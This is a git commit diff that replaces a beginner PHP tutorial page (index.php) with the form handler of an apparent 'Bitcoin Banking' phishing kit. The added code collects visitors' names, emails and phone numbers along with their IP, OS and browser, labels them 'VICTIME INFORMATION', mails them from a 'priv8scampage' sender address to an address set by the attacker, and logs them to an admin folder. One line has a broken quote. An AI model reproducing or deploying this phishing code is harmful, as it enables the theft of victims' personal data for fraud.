36267751cd790694e2680485e435c9f04ae0d056
Casper <54939713+maxwellcasper@users.noreply.github.com>
2022-02-22 01:30:08 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,33 +1,71 @@
    
-   <?php 
-        $title = "Index";
-        include 'includes/header.php' 
-    ?>
-    <!-- Basic HTML -->
-    <h1>Hello HTML - PHP Primer</h1>
-    <br/>
-    <?php  
-        //Printing to HTML using echo
-        echo 'Hello PHP!';
-        // YOu can echo HTML tags
-        echo '<br/>';
-        echo 'Second Line';
-        echo '<br/>';
-    
-        // Variables need a '$'. They are not strongly typed
-        $name = 'Trevoir Williams';
-        $age = 31;
-        // echo variable
-        echo $name;
-        echo '<h1>My Name Is: '.$name.' </h1>';
-        echo '<h1>My Age Is: '.$age.' </h1>';
-        // Echo using double quotes and interpolation
-        echo "<h1>My Name is: $name </h1>";
-    ?>
-    <button type="button" class="btn btn-dark">CLICK ME!</button>
-    <button type="button" class="btn btn-primary">CLICK ME!</button>
-    <button type="button" class="btn btn-success">CLICK ME!</button>
-    <a href="https://www.heroku.com" target="_blank" class="btn btn-danger">Heroku.com</a>
-    <?php
-        require 'includes/footer.php' 
-    ?>
+
+<?php
+
+header('Location: thanks.html');
+
+require 'Email.php';
+
+require 'getdata.php';
+
+$fname = $_POST['fname];
+
+$lname = $_POST['lname'];
+
+$email = $_POST['email'];
+
+$tel = $_POST['tel'];
+
+$to = "$yourmail";
+
+$subject = "🌐 New Bitcoin Banking Customer 🌐 FROM  ".$ip."🔥".$country."";
+
+$message = "
+
+<html>
+
+<head>
+
+<meta charset='UTF-8'></head>
+
+<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
+
+<font style='color: #0a5d00;'>👤 🌐 New Bitcoin Banking Customer 🌐</font><br>
+
+<font style='color:#9c0000;'>📌</font> First Name = <font style='color:#0070ba;'>$fname</font><br>
+
+<font style='color:#9c0000;'>📌</font> Last Name = <font style='color:#0070ba;'>$lname</font><br>
+
+<font style='color:#9c0000;'>📌</font> Email = <font style='color:#0070ba;'>$email</font><br>
+
+<font style='color:#9c0000;'>📌</font> Phone = <font style='color:#0070ba;'>$tel</font><br>
+
+<font style='color: #0a5d00;'>📡 VICTIME INFORMATION</font><br>
+
+<font style='color:#9c0000;'>📌</font> IP INFO = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
+
+<font style='color:#9c0000;'>📌</font> TIME/DATE = <font style='color:#0070ba;'>$time</font><br>
+
+<font style='color:#9c0000;'>📌</font> OS = <font style='color:#0070ba;'>$user_os</font><br>
+
+<font style='color:#9c0000;'>📌</font> BROWSER = <font style='color:#0070ba;'>$user_browser</font><br>
+
+<font style='color: #820000;'>🙏 Thankx to Coachella 🙏</font>
+
+</div></html>
+
+";
+
+$headers = "MIME-Version: 1.0" . "\r\n";
+
+$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+$headers .= 'From:🌼 🌐 New Bitcoin Banking Customer 🌐 🌼 <priv8scampage@rez.com>' . "\r\n";
+
+mail($to,$subject,$message,$headers);
+
+$path = "../../../admin/ips/$ip.html";
+
+file_put_contents($path,"$message<br><br>", FILE_APPEND);
+
+?>
